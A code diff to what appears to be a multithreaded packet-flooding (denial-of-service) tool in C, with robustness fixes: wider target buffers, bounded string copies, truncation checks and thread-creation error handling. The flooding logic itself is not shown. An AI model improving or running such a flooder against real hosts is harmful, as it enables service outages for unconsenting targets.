@@ -27,6 +27,7 @@
 #define MIN_PAYLOAD 90
 #define MAX_PAYLOAD 120
 #define FIN_PACKET_INTERVAL 1000
+#define MAX_IP_PORT_LEN 32  // Suficiente para "255.255.255.255:65535"
 
 // Configuration structure
 typedef struct {
@@ -39,7 +40,7 @@ typedef struct {
 
 // Thread data structure
 typedef struct {
-    char target_ip[16];
+    char target_ip[MAX_IP_PORT_LEN];  // Aumentado de 16 a 32
     int thread_id;
     volatile int *running;
 } thread_data_t;
@@ -259,11 +260,16 @@ void *flood_thread(void *arg) {
     char *colon = strchr(data->target_ip, ':');
     
     if (colon) {
-        strncpy(target_ip, data->target_ip, colon - data->target_ip);
-        target_ip[colon - data->target_ip] = '\0';
-        target_port = atoi(colon + 1);
+        size_t ip_len = colon - data->target_ip;
+        if (ip_len >= sizeof(target_ip)) {
+            ip_len = sizeof(target_ip) - 1;
+        }
+        strncpy(target_ip, data->target_ip, ip_len);
+        target_ip[ip_len] = '\0';
+        target_port = (unsigned short)atoi(colon + 1);
     } else {
-        strcpy(target_ip, data->target_ip);
+        strncpy(target_ip, data->target_ip, sizeof(target_ip) - 1);
+        target_ip[sizeof(target_ip) - 1] = '\0';
         target_port = 80;  // Default port
     }
     
@@ -276,7 +282,8 @@ void *flood_thread(void *arg) {
     
     // Validate target address
     if (target.sin_addr.s_addr == INADDR_NONE) {
-        fprintf(stderr, "Thread %d: Invalid target IP address\n", data->thread_id);
+        fprintf(stderr, "Thread %d: Invalid target IP address: %s\n", 
+                data->thread_id, target_ip);
         free(data);
         pthread_exit(NULL);
     }
@@ -290,7 +297,8 @@ void *flood_thread(void *arg) {
         pthread_exit(NULL);
     }
     
-    printf("Thread %d started\n", data->thread_id);
+    printf("Thread %d started - Target: %s:%u\n", 
+           data->thread_id, target_ip, target_port);
     
     unsigned int packet_count = 0;
     
@@ -344,10 +352,11 @@ int main(int argc, char *argv[]) {
     // Parse arguments
     config_t config;
     strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
-    config.target_port = atoi(argv[2]);
-    config.threads = atoi(argv[3]);
+    config.target_ip[sizeof(config.target_ip) - 1] = '\0';
+    config.target_port = (unsigned int)atoi(argv[2]);
+    config.threads = (unsigned int)atoi(argv[3]);
     config.pps_limit = atoi(argv[4]);
-    config.duration = atoi(argv[5]);
+    config.duration = (unsigned int)atoi(argv[5]);
     
     // Validate arguments
     if (config.threads < 1 || config.threads > 1000) {
@@ -382,8 +391,14 @@ int main(int argc, char *argv[]) {
             continue;
         }
         
-        snprintf(data->target_ip, sizeof(data->target_ip), "%s:%u", 
-                 config.target_ip, config.target_port);
+        // Formatear IP:Puerto de forma segura
+        int written = snprintf(data->target_ip, sizeof(data->target_ip), 
+                              "%s:%u", config.target_ip, config.target_port);
+        if (written < 0 || (size_t)written >= sizeof(data->target_ip)) {
+            fprintf(stderr, "Warning: Truncated target string for thread %u\n", i);
+            data->target_ip[sizeof(data->target_ip) - 1] = '\0';
+        }
+        
         data->thread_id = i;
         data->running = &global_running;
         
@@ -395,7 +410,10 @@ int main(int argc, char *argv[]) {
     
     // Start statistics thread
     pthread_t stats_thread;
-    pthread_create(&stats_thread, NULL, (void *(*)(void *))print_stats, NULL);
+    if (pthread_create(&stats_thread, NULL, (void *(*)(void *))print_stats, NULL) != 0) {
+        perror("Failed to create stats thread");
+        global_running = 0;
+    }
     
     // Run for specified duration
     sleep(config.duration);
